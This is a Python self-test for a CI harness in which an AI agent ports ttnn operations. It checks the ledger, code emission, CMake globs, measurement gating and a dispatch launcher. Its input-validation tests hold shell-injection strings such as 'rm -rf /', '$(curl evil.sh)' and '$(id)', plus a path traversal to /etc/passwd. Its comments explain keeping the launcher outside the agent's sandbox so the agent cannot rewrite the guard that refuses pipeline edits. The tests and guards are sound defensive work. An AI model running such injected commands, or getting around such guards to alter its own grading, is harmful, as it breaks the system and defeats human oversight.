#!/usr/bin/env python3
# SPDX-FileCopyrightText: © 2026 Tenstorrent USA, Inc.
#
# SPDX-License-Identifier: Apache-2.0

"""Harness self-test: runs on a laptop, with ttnn and the sweep module stubbed.

The pieces covered here are the ones that cannot be exercised on a developer machine any other way --
`ledger.py` imports a sweep module that imports ttnn and torch, so the only way to test its
classification logic without a device is to hand it a fake sweep module and a fake ttnn.

Every check below corresponds to a defect that reached the workflow and was found by reading rather
than by running: a manifest naming several sweep suites raised `TypeError: unhashable type: 'list'`
before anything ran; `port_scope` was declared by a manifest and honoured by nobody, which would have
force-graded a large slice of out-of-scope cases as in-scope; and a case whose kwargs hold a live
ttnn object had those objects flattened to strings by the ledger's JSON, so every `ttnn` call built
from them raised. `pad` has none of those three shapes, which is why it never noticed.

Run it directly: `python3 .github/scripts/port/selftest.py`.
"""

import json
import sys
import types
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

failures = []


def check(name, cond, detail=""):
    print(f"{'PASS' if cond else 'FAIL'}  {name}" + (f"  -- {detail}" if detail and not cond else ""))
    if not cond:
        failures.append(name)


# ---------------------------------------------------------------- stub ttnn
class MemoryConfig:
    """Stands in for ttnn's MemoryConfig: unhashable-by-value repr, no source form."""

    def __init__(self, tag):
        self.tag = tag

    def __eq__(self, other):
        return isinstance(other, MemoryConfig) and other.tag == self.tag

    def __repr__(self):
        return f"MemoryConfig(memory_layout=TensorMemoryLayout::INTERLEAVED,buffer_type=BufferType::{self.tag})"


class DataType:
    def __init__(self, n):
        self.n = n

    def __repr__(self):
        return f"DataType.{self.n}"


ttnn = types.ModuleType("ttnn")
ttnn.DRAM_MEMORY_CONFIG = MemoryConfig("DRAM")
ttnn.L1_MEMORY_CONFIG = MemoryConfig("L1")
ttnn.bfloat16 = DataType("BFLOAT16")
ttnn.bfloat8_b = DataType("BFLOAT8_B")
ttnn.TILE_LAYOUT = "Layout.TILE"
ttnn.untilize = lambda *a, **k: None          # callable -> must be skipped as a "constant"
ttnn.MemoryConfig = MemoryConfig              # a type -> must be skipped too
MemoryConfig.__module__ = "ttnn._ttnn.tensor"
DataType.__module__ = "ttnn._ttnn.tensor"
sys.modules["ttnn"] = ttnn

# --------------------------------------------------- stub the sweep module
nightly = {
    "input_shape": [[1, 1, 32, 32], [1, 1, 33, 64], [1, 1, 64, 64], [1, 1, 65, 128]],
    "input_a_dtype": [ttnn.bfloat16, ttnn.bfloat8_b],
    "input_a_layout": [ttnn.TILE_LAYOUT],
    "output_memory_config": [ttnn.DRAM_MEMORY_CONFIG, ttnn.L1_MEMORY_CONFIG],
}
broaden = {
    # [1,1,32,32] duplicates a nightly point exactly -> must dedupe away.
    "input_shape": [[1, 1, 32, 32], [1, 1, 128, 256]],
    "input_a_dtype": [ttnn.bfloat8_b],
    "input_a_layout": [ttnn.TILE_LAYOUT],
    "output_memory_config": [ttnn.DRAM_MEMORY_CONFIG, ttnn.L1_MEMORY_CONFIG],
    "shard_strategy": ["none"],          # a key nightly does not have
}
sweep = types.ModuleType("fake_sweep")
sweep.parameters = {"nightly": nightly, "broaden_suite": broaden}
sweep.invalidate_vector = lambda v: (False, None)
sys.modules["fake_sweep"] = sweep

import ledger  # noqa: E402
import scaffold  # noqa: E402

MANIFEST = {
    "op": "untilize",
    "sweep_module": "fake_sweep",
    "sweep_suite": ["nightly", "broaden_suite"],
    "vector_map": {
        "shape": "input_shape",
        "dtype": "input_a_dtype",
        "layout": "input_a_layout",
        "kwargs": {"memory_config": "output_memory_config"},
    },
    "coverage": {"dtypes": ["bfloat16", "bfloat8_b"], "layouts": ["tile"]},
    "port_scope": {"layouts": ["tile"], "dtypes": ["bfloat16", "bfloat8_b"], "tile_aligned": ["bfloat8_b"]},
}

# ============================================ 1. multi-suite union + dedupe
cases = ledger.build_ledger(MANIFEST)
check("list sweep_suite does not raise", True)

expected = (4 * 2 * 2) + (2 * 1 * 2) - 2  # nightly 16, broaden 4, minus 2 exact duplicates
check("union dedupes overlapping points", len(cases) == expected, f"{len(cases)} != {expected}")

ids = [c["case_id"] for c in cases]
check("case ids stay unique and contiguous", ids == [f"fake_sweep[{i}]" for i in range(len(cases))])
check("suite provenance recorded", {c["suite"] for c in cases} == {"nightly", "broaden_suite"})

repeat = ledger.build_ledger(MANIFEST)
check("expansion is deterministic", [c["case_id"] for c in repeat] == ids)
check(
    "same cases in same order",
    [(c["shape"], c["dtype"], c["suite"]) for c in repeat] == [(c["shape"], c["dtype"], c["suite"]) for c in cases],
)

# =========================================================== 2. port_scope
def scope_of(dtype, shape):
    for c in cases:
        if c["dtype"] == dtype and c["shape"] == shape:
            return c["scope"], c.get("reason")
    return None, None

check("aligned bfloat8_b is in scope", scope_of("bfloat8_b", [1, 1, 32, 32])[0] == "in")
s, r = scope_of("bfloat8_b", [1, 1, 33, 64])
check("non-aligned bfloat8_b is out of scope", s == "out", f"got {s}")
check("and says why", bool(r) and "tile-aligned" in r, str(r))
# One reason for the whole class, not one per shape: it is the routing test's grouping key.
check("the reason does not name the shape", bool(r) and "33" not in r, str(r))
check("non-aligned bfloat16 stays in scope", scope_of("bfloat16", [1, 1, 33, 64])[0] == "in")
check("aligned bfloat16 stays in scope", scope_of("bfloat16", [1, 1, 64, 64])[0] == "in")

n_out = sum(1 for c in cases if c["scope"] == "out")
check("out-of-scope set is non-empty", n_out > 0, f"{n_out}")

# port_scope absent must narrow nothing (this is what keeps pad unchanged)
bare = dict(MANIFEST)
bare.pop("port_scope")
check("no port_scope -> nothing out of scope", all(c["scope"] == "in" for c in ledger.build_ledger(bare)))

# ============================== 3. kwargs keep live ttnn objects, not strings
kw = cases[0]["kwargs"]["memory_config"]
check("kwargs hold the live object", isinstance(kw, MemoryConfig), type(kw).__name__)
# The reason measure.py re-expands the ledger in process instead of reading the JSON beside it. If
# this ever stops being a string, that indirection can go.
round_tripped = json.loads(json.dumps({"cases": cases}, default=str))["cases"][0]["kwargs"]["memory_config"]
check("ledger JSON still cannot carry a ttnn object", isinstance(round_tripped, str))

# ==================================== 4. emitter renders MemoryConfig kwargs
check("_literal names a ttnn constant", scaffold._literal(ttnn.DRAM_MEMORY_CONFIG) == "ttnn.DRAM_MEMORY_CONFIG")
check("_literal distinguishes the two", scaffold._literal(ttnn.L1_MEMORY_CONFIG) == "ttnn.L1_MEMORY_CONFIG")
check("_literal renders an equal-but-new object", scaffold._literal(MemoryConfig("DRAM")) == "ttnn.DRAM_MEMORY_CONFIG")
try:
    scaffold._literal(MemoryConfig("WEIRD"))
    check("_literal refuses an unnameable ttnn object", False, "no raise")
except TypeError:
    check("_literal refuses an unnameable ttnn object", True)

src = scaffold.render_routing_test("untilize", "data_movement", cases, year=2026)
check("emitted routing test is parseable Python", True)
try:
    compile(src, "test_untilize_codegen_routing.py", "exec")
except SyntaxError as exc:
    check("emitted routing test is parseable Python", False, str(exc))
check("emitted test carries the memory_config", "ttnn.DRAM_MEMORY_CONFIG" in src)
check("emitted test has no object addresses", "0x" not in src and "object at" not in src)
check("emitted test is stable across renders", src == scaffold.render_routing_test("untilize", "data_movement", cases, year=2026))

# ==================================== 5. empty out-of-scope set stays valid
allin = [dict(c, scope="in") for c in cases]
empty = scaffold.render_routing_test("untilize", "data_movement", allin, year=2026)
try:
    compile(empty, "t.py", "exec")
    check("empty out-of-scope set still emits valid Python", True)
except SyntaxError as exc:
    check("empty out-of-scope set still emits valid Python", False, str(exc))

# ============== 6. kernel globs land in the glob call, not in target_sources
# Mirrors data_movement/CMakeLists.txt: the op appears both as a glob and as explicit FILES entries.
CMAKE = """include(sources.cmake)

file(
    GLOB_RECURSE kernels
    pad/device/kernels/*.cpp
    tilize/device/kernels/*.cpp
    untilize/device/kernels/*.cpp
    untilize_with_unpadding/device/kernels/*.cpp
)
target_sources(
    ttnn_op_data_movement
    PUBLIC
        FILE_SET kernels
        TYPE HEADERS
        BASE_DIRS ${CMAKE_CURRENT_SOURCE_DIR}
        FILES
            ${kernels}
            untilize/device/kernels/dataflow/reader_unary_start_id.cpp
            untilize/device/kernels/dataflow/writer_unary_stick_layout_split_rows_multi_core.cpp
            tilize_with_val_padding/device/kernels/dataflow/reader_unary_pad_multicore_both_dims.cpp
    PRIVATE
        ${TTNN_OP_DATA_MOVEMENT_SRCS}
)
"""

import tempfile  # noqa: E402

for op, expect_beside in (("untilize", True), ("permute", False)):
    with tempfile.TemporaryDirectory() as tmp:
        category = Path(tmp)
        (category / "CMakeLists.txt").write_text(CMAKE)
        (category / "sources.cmake").write_text(f"    {op}/{op}.cpp\n")
        kernels = category / op / "codegen" / "kernels"
        kernels.mkdir(parents=True)
        (kernels / "k.cpp").write_text("")
        (kernels / "k.h").write_text("")

        added = scaffold.register_kernel_globs(category, op, kernels)
        out = (category / "CMakeLists.txt").read_text()
        lines = out.splitlines()
        start, close = scaffold.glob_block(out)
        placed = [i for i, ln in enumerate(lines) if ln.strip().startswith(f"{op}/codegen/kernels/")]

        check(f"[{op}] both extensions added", added == [f"{op}/codegen/kernels/*.cpp", f"{op}/codegen/kernels/*.h"])
        check(f"[{op}] globs land inside the glob call", placed and all(start < i < close for i in placed),
              f"placed={[i + 1 for i in placed]} block={start + 1}..{close + 1}")
        check(f"[{op}] target_sources FILES list untouched",
              out.split("target_sources")[1] == CMAKE.split("target_sources")[1])
        check(f"[{op}] indentation matches its neighbours",
              all(lines[i].startswith("    ") and not lines[i].startswith("     ") for i in placed))
        if expect_beside:
            check(f"[{op}] sits beside the op's own native glob",
                  lines[placed[0] - 1].strip() == f"{op}/device/kernels/*.cpp")
        else:
            check(f"[{op}] with no native glob, goes in last", placed[-1] == close - 1)

        # The check that would have caught the bug: it must object when a glob sits outside the call.
        broken = CMAKE.replace(
            "            untilize/device/kernels/dataflow/reader_unary_start_id.cpp\n",
            f"            untilize/device/kernels/dataflow/reader_unary_start_id.cpp\n    {op}/codegen/kernels/*.cpp\n",
        )
        (category / "CMakeLists.txt").write_text(broken)
        op_dir = category / op
        (op_dir / "codegen").mkdir(parents=True, exist_ok=True)
        for c in scaffold.COMPONENTS:
            for ext in ("hpp", "cpp"):
                (op_dir / "codegen" / f"{op}_codegen_{c}.{ext}").write_text("x")
        (category / "sources.cmake").write_text(
            "".join(f"    {op}/codegen/{op}_codegen_{c}.cpp\n" for c in scaffold.COMPONENTS)
        )
        errors = scaffold.verify(op_dir, op, [])
        check(f"[{op}] verify rejects a glob outside the call",
              any("outside file(GLOB_RECURSE" in e for e in errors), str(errors))

# ====== 7. strata labels agree across the JSON boundary, and are readable
import strata  # noqa: E402

axes, _ = strata.choose_axes(cases, 24)
check("memory_config is an axis", "kwargs.memory_config" in axes, str(axes))

live_labels = [strata.stratum_key(c, axes) for c in cases]
# What gate.py sees: the ledger after ledger.py has written and reloaded it.
reloaded = json.loads(json.dumps({"cases": cases}, indent=2, default=str))["cases"]
json_labels = [strata.stratum_key(c, axes) for c in reloaded]
check("measure-side and gate-side labels agree", live_labels == json_labels,
      f"{live_labels[0]!r} != {json_labels[0]!r}")
check("labels name the constant instead of dumping its repr",
      all("DRAM_MEMORY_CONFIG" in l or "L1_MEMORY_CONFIG" in l for l in live_labels), live_labels[0])
check("labels carry no C++ field dump", not any("memory_layout=" in l for l in live_labels), live_labels[0])

# ============ 8. a leg may span several op codes across cases, but not within one
import gate  # noqa: E402

def attribute(rows, order):
    with tempfile.NamedTemporaryFile("w", suffix=".csv", delete=False) as fh:
        fh.write("OP CODE,DEVICE KERNEL DURATION [NS]\n")
        for code, ns in rows:
            fh.write(f"{code},{ns}\n")
        name = fh.name
    return gate.attribute_device_rows(Path(name), order)

# untilize's real shape: native is one device op on an aligned case and another on a non-aligned one.
order, rows = [], []
for case_id, native_code in (("c0", "UntilizeDeviceOperation"), ("c1", "UntilizeWithUnpaddingDeviceOperation")):
    for leg, code in (("native", native_code), ("ported", "UntilizeCodegenDeviceOperation")):
        order.append({"case_id": case_id, "leg": f"{leg}:warmup", "rep": -1, "error": None})
        rows.append((code, 100.0))
    for rep in range(2):
        for leg, code in (("native", native_code), ("ported", "UntilizeCodegenDeviceOperation")):
            order.append({"case_id": case_id, "leg": leg, "rep": rep, "error": None})
            rows.append((code, 200.0 if leg == "native" else 150.0))

samples, notes = attribute(rows, order)
check("a leg spanning two op codes across cases is accepted", bool(samples), str(notes))
check("both op codes are reported", any("op codes:" in n and "UntilizeWithUnpadding" in n for n in notes), str(notes))
check("samples are attributed per case and leg",
      sorted(samples) == [("c0", "native"), ("c0", "ported"), ("c1", "native"), ("c1", "ported")])

# A demoted case sends the ported leg to the native op: same code on two legs, still fine.
demoted_rows = [(c if l.startswith("native") or "warmup" in l else "UntilizeDeviceOperation", ns)
                for (c, ns), l in zip(rows, [o["leg"] for o in order])]
samples, notes = attribute(demoted_rows, order)
check("a demoted case sharing native's op code is accepted", bool(samples), str(notes))

# But a slipped positional join shows up as two op codes for one case and leg.
slipped = list(rows)
slipped[4] = ("SomethingElseDeviceOperation", 200.0)
samples, notes = attribute(slipped, order)
check("a slip within one case and leg is still caught", not samples and any("inconclusive" in n for n in notes),
      str(notes))

# --------------------------------------------------------------------------------------------
# dispatch.py: what it does to the working tree before anything leaves the machine.
#
# The launcher runs in the agent's job, on the agent's checkout, and everything downstream depends
# on it snapshotting exactly the right thing: the scaffolded stubs (untracked), the tracked edits,
# and neither the generator checkout nor build output. It also must not disturb the tree it is
# snapshotting, because the agent is still working in it. None of that is observable from a
# workflow run until 25 minutes in, and all of it is checkable here in a second.

import subprocess  # noqa: E402

import dispatch  # noqa: E402


def _git(repo, *args):
    return subprocess.run(["git", *args], cwd=repo, capture_output=True, text=True, check=True).stdout.strip()


with tempfile.TemporaryDirectory() as tmp:
    repo = Path(tmp) / "repo"
    work = Path(tmp) / "work"
    (repo / ".git").mkdir(parents=True)
    work.mkdir()
    _git(repo, "init", "-q", ".")
    _git(repo, "config", "user.email", "t@t.co")
    _git(repo, "config", "user.name", "t")
    (repo / "tracked.txt").write_text("base\n")
    (repo / ".gitignore").write_text("build/\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "base")
    (repo / ".git" / "info").mkdir(exist_ok=True)
    (repo / ".git" / "info" / "exclude").write_text(".codegen/\n")

    # The state the launcher meets: a scaffolded stub, an edit, the generator checkout, build output.
    stub = repo / "ttnn/cpp/ttnn/operations/data_movement/untilize/codegen"
    stub.mkdir(parents=True)
    (stub / "factory.cpp").write_text("// filled in by the agent\n")
    (repo / ".codegen/agentic_port").mkdir(parents=True)
    (repo / ".codegen/agentic_port/builder.py").write_text("generator\n")
    (repo / "build").mkdir()
    (repo / "build/lib.so").write_text("artifact\n")
    (repo / "tracked.txt").write_text("edited\n")

    # Something staged, to prove the scratch index does not collide with the agent's.
    _git(repo, "add", "tracked.txt")
    staged_before = _git(repo, "diff", "--cached", "--name-only")

    base_before = _git(repo, "rev-parse", "HEAD")
    commit, base = dispatch.commit_worktree(repo, work, "test")
    listed = _git(repo, "ls-tree", "-r", "--name-only", commit).splitlines()

    check("the scratch commit carries the untracked scaffolded stubs",
          "ttnn/cpp/ttnn/operations/data_movement/untilize/codegen/factory.cpp" in listed, str(listed))
    check("the scratch commit carries tracked edits",
          _git(repo, "show", f"{commit}:tracked.txt") == "edited", str(listed))
    check("the generator checkout is excluded",
          not any(p.startswith(".codegen/") for p in listed), str(listed))
    check("build output is excluded", not any(p.startswith("build/") for p in listed), str(listed))
    check("the commit is parented on the base", _git(repo, "rev-parse", f"{commit}^") == base_before)
    check("exactly one commit above the base, so a depth-1 fetch finds it",
          _git(repo, "rev-list", "--count", f"{base_before}..{commit}") == "1")
    check("HEAD does not move", _git(repo, "rev-parse", "HEAD") == base_before)
    check("the agent's index is untouched", _git(repo, "diff", "--cached", "--name-only") == staged_before)
    check("the reported base is HEAD", base == base_before)

    # Called twice without an intervening change: same tree, and no leftover index to trip over.
    again, _ = dispatch.commit_worktree(repo, work, "test")
    check("a second call snapshots the same tree",
          _git(repo, "rev-parse", f"{commit}^{{tree}}") == _git(repo, "rev-parse", f"{again}^{{tree}}"))

    # The pushed copy of the workflow is the copy that runs, so an edit to it is not a proposal.
    (repo / ".github/workflows").mkdir(parents=True)
    (repo / ".github/workflows/port-measure.yaml").write_text("on: push\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "add the pipeline")
    pipeline_base = _git(repo, "rev-parse", "HEAD")
    (repo / ".github/workflows/port-measure.yaml").write_text("on: push\n# and something else\n")
    tampered, _ = dispatch.commit_worktree(repo, work, "test")
    try:
        dispatch.refuse_pipeline_edits(repo, pipeline_base, tampered)
        check("a snapshot touching the pipeline is refused", False, "it was allowed")
    except dispatch.DispatchError as exc:
        check("a snapshot touching the pipeline is refused",
              "port-measure.yaml" in str(exc), str(exc))

    (repo / ".github/workflows/port-measure.yaml").write_text("on: push\n")
    (repo / "tracked.txt").write_text("an ordinary edit\n")
    ordinary, _ = dispatch.commit_worktree(repo, work, "test")
    dispatch.refuse_pipeline_edits(repo, pipeline_base, ordinary)
    check("an ordinary port edit still goes through", True)

    # The baseline dispatch hands the routing test back inside `workspace/`, at its repo-relative
    # path, and the launcher has to place it without being told where it belongs.
    results = Path(tmp) / "results"
    rel = "tests/ttnn/nightly/unit_tests/operations/data_movement/test_untilize_codegen_routing.py"
    (results / "workspace" / rel).parent.mkdir(parents=True)
    (results / "workspace" / rel).write_text("# generated\n")
    (results / "gate.json").write_text("{}")
    adopted = dispatch.adopt_workspace(results, repo)
    check("the generated test is laid down at its repo-relative path", adopted == [rel], str(adopted))
    check("only workspace/ is adopted, not the verdict", (repo / rel).is_file() and not (repo / "gate.json").exists())

# --------------------------------------------------------------------------------------------
# The seam between the launcher and the workflow: parameters ride in the scratch commit message,
# and port-measure.yaml's `resolve` job reads them back. The two halves live in different files and
# different languages, and nothing in either would notice if they stopped agreeing -- the symptom
# would be a run that dies in its first job, 20 minutes after the agent asked for it.
#
# So the checker below is the real one, lifted out of the YAML rather than reimplemented. It also
# stands in for the validation itself: every one of these values is interpolated into a shell
# command on the device runner.

import os  # noqa: E402

import yaml  # noqa: E402

WORKFLOW = Path(__file__).resolve().parents[2] / "workflows" / "port-measure.yaml"


def _resolve(message: str) -> tuple[int, dict]:
    """Run port-measure.yaml's `resolve` step the way Actions would, on `message`."""
    body = yaml.safe_load(WORKFLOW.read_text())["jobs"]["resolve"]["steps"][0]["run"]
    script = body.split("<<'PY'", 1)[1].rsplit("PY", 1)[0]
    with tempfile.TemporaryDirectory() as tmp:
        out = Path(tmp) / "out"
        out.touch()
        done = subprocess.run(
            [sys.executable, "-c", script],
            capture_output=True,
            text=True,
            env={**os.environ, "PORT_PARAMS": message, "GITHUB_OUTPUT": str(out)},
        )
        parsed = dict(
            line.split("=", 1) for line in out.read_text().splitlines() if "=" in line
        )
    return done.returncode, parsed


sent = {
    "mode": "verify",
    "band": "correctness",
    "op": "untilize",
    "category": "data_movement",
    "codegen-ref": "codegen_agentic_port",
    "perf-limit": "24",
    "base-sha": "a" * 40,
    "runner-label": '["tt-ubuntu-2204-N150-viommu-stable"]',
    "nonce": "1-abc",
}
code, got = _resolve(json.dumps(sent, separators=(",", ":")))
check("the workflow accepts what the launcher writes", code == 0, f"exit {code}")
check(
    "every parameter survives the commit message intact",
    all(got.get(k) == v for k, v in sent.items() if k != "nonce"),
    f"sent {sent}, got {got}",
)

# Defaults, because the launcher may legitimately omit the optional half.
code, got = _resolve('{"mode":"build"}')
check("a minimal message resolves to defaults", code == 0 and got.get("op") == "untilize", str(got))

# Nothing here should ever reach a shell able to act on it.
for label, message in [
    ("a shell metacharacter in op", '{"mode":"verify","op":"untilize; rm -rf /"}'),
    ("a command substitution in op", '{"mode":"verify","op":"$(curl evil.sh)"}'),
    ("an unknown mode", '{"mode":"nonsense"}'),
    ("an injected band", '{"mode":"verify","band":"; echo pwned"}'),
    ("a non-numeric perf-limit", '{"mode":"verify","perf-limit":"1e9"}'),
    ("a base-sha that is not a sha", '{"mode":"verify","base-sha":"not-a-sha"}'),
    ("a runner label with a space in it", '{"mode":"verify","runner-label":"[\\"a b; halt\\"]"}'),
    ("a message that is not JSON at all", "wip: fixing the thing"),
]:
    code, _ = _resolve(message)
    check(f"the workflow rejects {label}", code != 0, "it was accepted")

# --------------------------------------------------------------------------------------------
# Starting and collecting are separate calls, because the MCP gateway will not let one tool call
# last as long as a build. That split is only safe if a `wait` that runs out of budget is clearly
# distinguishable from a `wait` that found a failure -- otherwise the agent reads "not finished" as
# "your port is broken" and starts editing working code.


class _FakeApi:
    """Enough of `Api` for the waiter: a scripted sequence of run statuses."""

    repo = "owner/repo"

    def __init__(self, statuses: list[str]) -> None:
        self.statuses = statuses
        self.polls = 0

    def get_json(self, _url: str) -> dict:
        status = self.statuses[min(self.polls, len(self.statuses) - 1)]
        self.polls += 1
        return {
            "id": 1,
            "status": status,
            "html_url": "https://example.invalid/run/1",
            "conclusion": "success" if status == "completed" else None,
        }


def _with_fake_clock(fn):
    """Run `fn` with time advancing only when the code under test sleeps."""
    clock = {"now": 0.0}
    real_sleep, real_monotonic = dispatch.time.sleep, dispatch.time.monotonic
    dispatch.time.sleep = lambda seconds: clock.__setitem__("now", clock["now"] + seconds)
    dispatch.time.monotonic = lambda: clock["now"]
    try:
        return fn(), clock["now"]
    finally:
        dispatch.time.sleep, dispatch.time.monotonic = real_sleep, real_monotonic


run = {"id": 1, "html_url": "https://example.invalid/run/1"}

outcome, spent = _with_fake_clock(
    lambda: dispatch.wait_for_completion(_FakeApi(["in_progress"]), dict(run), "build", budget=420)
)
check("a run still going returns nothing rather than a verdict", outcome is None, repr(outcome))
check("and gives up inside its budget", spent <= 420, f"blocked for {spent}s against a 420s budget")

outcome, _ = _with_fake_clock(
    lambda: dispatch.wait_for_completion(
        _FakeApi(["queued", "in_progress", "completed"]), dict(run), "build", budget=420
    )
)
check("a run that lands inside the budget comes back", (outcome or {}).get("status") == "completed", repr(outcome))

# The run's own life, not this slice of it, is what decides it has hung -- otherwise a run polled in
# seven-minute slices could never exceed any ceiling and would be waited on forever.
try:
    _with_fake_clock(
        lambda: dispatch.wait_for_completion(
            _FakeApi(["in_progress"]), dict(run), "verify", budget=420, age=dispatch.RUN_COMPLETE_TIMEOUT
        )
    )
    check("a run past the overall ceiling is abandoned", False, "it kept waiting")
except dispatch.ApiError as exc:
    check("a run past the overall ceiling is abandoned", "has not finished" in str(exc), str(exc))

with tempfile.TemporaryDirectory() as tmp:
    work = Path(tmp)
    dispatch.save_job(work, "1-abcd", {"handle": "1-abcd", "mode": "build", "run_id": 7})
    check("a handle survives to the next call", dispatch.load_job(work, "1-abcd")["run_id"] == 7)
    try:
        dispatch.load_job(work, "1-wrong")
        check("an unknown handle is refused", False, "it was accepted")
    except dispatch.DispatchError as exc:
        check("an unknown handle is refused, and says what is in flight", "1-abcd" in str(exc), str(exc))
    dispatch.forget_job(work, "1-abcd")
    try:
        dispatch.load_job(work, "1-abcd")
        check("a collected handle is not reusable", False, "it was accepted")
    except dispatch.Refusal as exc:
        # A Refusal specifically: waiting on a spent handle is a mistake the agent can correct, and
        # if it arrives as a crashed tool the agent will retry it rather than start a fresh one.
        check("a collected handle is not reusable", "start a fresh build" in str(exc), str(exc))

# The handle is agent-supplied text that reaches a command line, so the guard is lifted out of the
# workflow rather than reimplemented, exactly as the resolve check above is.
PORT_OP = Path(__file__).resolve().parents[2] / "workflows" / "port-op.md"

import shutil  # noqa: E402

_harness_home = tempfile.mkdtemp()
(Path(_harness_home) / ".port-harness").mkdir()
shutil.copy2(
    Path(__file__).resolve().parent / "dispatch.py",
    Path(_harness_home) / ".port-harness" / "dispatch.py",
)


def _wait_guard(handle: str) -> int:
    frontmatter = yaml.safe_load(PORT_OP.read_text().split("---", 2)[1])
    script = frontmatter["mcp-scripts"]["wait"]["run"]
    # The tools invoke the launcher out of `$HOME/.port-harness`, not the workspace, so that the agent
    # cannot rewrite the thing that refuses to dispatch its edits to the pipeline. That means this test
    # has to stand up the same layout, or a well-formed handle fails for the wrong reason -- which is
    # exactly what it did when the path moved.
    home = Path(_harness_home)
    return subprocess.run(
        ["bash", "-c", script],
        capture_output=True,
        text=True,
        env={
            **os.environ,
            "HOME": str(home),
            "INPUT_HANDLE": handle,
            "GITHUB_WORKSPACE": str(Path(__file__).resolve().parents[3]),
            # So a developer's own dispatch credential cannot turn this into a live API call.
            "PORT_DISPATCH_TOKEN_FILE": "/nonexistent/token",
        },
    ).returncode


for label, handle in [
    ("a command substitution", "$(id)"),
    ("a chained command", "1-abc; rm -rf /"),
    ("a path traversal", "../../../etc/passwd"),
    ("an empty handle", ""),
]:
    check(f"the wait tool rejects {label}", _wait_guard(handle) == 2, "it was accepted")

check(
    "the wait tool accepts a handle the launcher would emit",
    _wait_guard("31599281955-82f8157f") != 2,
    "a well-formed handle was rejected",
)

# Every tool must invoke the launcher from outside the sandbox. `dispatch.py` is what refuses to push
# a snapshot touching `.github/`, and that refusal is the only thing keeping the `gate.py` that runs on
# CIv2 from being one the agent wrote. Invoked out of the workspace, the guard is deletable by the
# thing it guards against, and the write-path check that would notice runs inside the gate it would
# have replaced. Asserted here because the failure is silent: everything works exactly as before.
_frontmatter = yaml.safe_load(PORT_OP.read_text().split("---", 2)[1])
for _tool, _spec in _frontmatter["mcp-scripts"].items():
    check(
        f"the {_tool} tool runs the launcher from outside the sandbox",
        "$HOME/.port-harness/" in _spec["run"] and "GITHUB_WORKSPACE" not in _spec["run"],
        "it runs the copy in the workspace, which the agent can rewrite",
    )
_placer = next(
    (s for s in _frontmatter["steps"] if s.get("name") == "Place the launcher outside the sandbox"),
    None,
)
check("and something puts it there", _placer is not None)
if _placer:
    check(
        "the launcher copy is verified against the checkout",
        "cmp" in _placer["run"],
        "a silently truncated copy would grade the port",
    )

# --------------------------------------------------------------------------------------------
# How an answer is *framed* decides what the agent does with it. gh-aw rejects the handler promise
# on any non-zero exit, so a delivered answer that exits non-zero arrives as "Command failed", and
# the reasonable response to a broken tool is to call it again. Two agentic runs died that way.

check("a delivered answer exits zero for a tool", dispatch.delivered(1, True) == 0)
check("and keeps its code for a workflow step", dispatch.delivered(1, False) == 1)
check("a still-running reply is not an error either", dispatch.delivered(4, True) == 0)

check(
    "a refusal is a kind of answer, so the agent can act on it",
    issubclass(dispatch.Refusal, dispatch.DispatchError),
)

# Every tool the agent can call must pass the flag, or that tool alone regresses to the old
# behaviour and nothing else in the suite would notice.
_tools = yaml.safe_load(PORT_OP.read_text().split("---", 2)[1])["mcp-scripts"]
for name, spec in _tools.items():
    check(f"the {name} tool delivers answers rather than errors", "--as-tool" in spec["run"], spec["run"])
    check(f"the {name} tool returns inside the gateway's deadline", spec["timeout"] < 600, str(spec["timeout"]))

# A compile is deterministic, so the same tree cannot compile differently. Re-dispatching one costs
# nine minutes of a card to relearn the same diagnostics, which is what happened on 2026-08-12.
with tempfile.TemporaryDirectory() as tmp:
    work = Path(tmp)
    dispatch.refuse_pointless_dispatch(work, "build", "abc123")
    check("the first build of a tree goes through", True)
    try:
        dispatch.refuse_pointless_dispatch(work, "build", "abc123")
        check("rebuilding an unchanged tree is refused", False, "it was dispatched")
    except dispatch.Refusal as exc:
        check("rebuilding an unchanged tree is refused", "deterministic" in str(exc), str(exc))

    # The expensive mistake, seen on 2026-08-12: verify builds before it measures, so verifying a
    # tree that just failed to compile burns a card slot to reach the same error.
    dispatch.record_build_outcome(work, "abc123", ok=False)
    try:
        dispatch.refuse_pointless_dispatch(work, "verify", "abc123")
        check("verifying a tree that failed to build is refused", False, "it was dispatched")
    except dispatch.Refusal as exc:
        check("verifying a tree that failed to build is refused", "does not compile" in str(exc), str(exc))

    dispatch.record_build_outcome(work, "abc123", ok=True)
    dispatch.refuse_pointless_dispatch(work, "verify", "abc123")
    check("verifying a tree that built is allowed", True)
    # Measurement is noisy in a way compilation is not, so a second opinion stays allowed.
    dispatch.refuse_pointless_dispatch(work, "verify", "abc123")
    check("re-verifying the same built tree is still allowed", True)

    dispatch.refuse_pointless_dispatch(work, "build", "def456")
    check("an edited tree builds again", True)

# Nothing the measure job fetches may land in the checkout. An untracked file under /work is one
# `check_write_paths` attributes to the agent, and the agent cannot clear it: the download happens
# on the far side, after its snapshot was taken. On 2026-08-12 this returned `blocked` from every
# verify, naming `ttm_any.tar.zst` and the wheel as changes outside the port -- a verdict no edit to
# the port could have changed. Asserted here because the symptom appears 20 minutes downstream, on a
# card, and reads as the agent's fault rather than the workflow's.
_checkout = next(
    step["with"]["path"]
    for step in yaml.safe_load(WORKFLOW.read_text())["jobs"]["measure"]["steps"]
    if step.get("name") == "Checkout the port under test"
)
for _step in yaml.safe_load(WORKFLOW.read_text())["jobs"]["measure"]["steps"]:
    if "download-artifact" in str(_step.get("uses", "")):
        _into = _step["with"]["path"]
        check(
            f"'{_step['name']}' does not download into the checkout",
            _into != _checkout and not _into.startswith(f"{_checkout}/"),
            f"lands in {_into}, which is the checkout at {_checkout}",
        )

# ------------------------------------------------------- the correctness bar is prototype parity
#
# The port is graded against what tt-dm-codegen itself achieves, so an in-scope failure has to be
# attributed before it can block: the port's own defect, a gap the generator shares, or a divergence
# where the port is somehow better. Getting the attribution backwards is worse than having no
# attribution at all -- excusing a real defect makes the whole band meaningless -- so each of the
# three, and the fallbacks, are asserted here rather than discovered on a card.
import gate  # noqa: E402

_results = [
    {"case_id": "c[0]", "scope": "in", "equal": True, "error": None},
    {"case_id": "c[1]", "scope": "in", "equal": False, "error": None},  # port fails, prototype passes
    {"case_id": "c[2]", "scope": "in", "equal": False, "error": "RuntimeError: x"},  # both fail
    {"case_id": "c[3]", "scope": "in", "equal": True, "error": None},  # port passes, prototype fails
    {"case_id": "c[4]", "scope": "out", "equal": True, "error": None, "routing_ok": True},
]
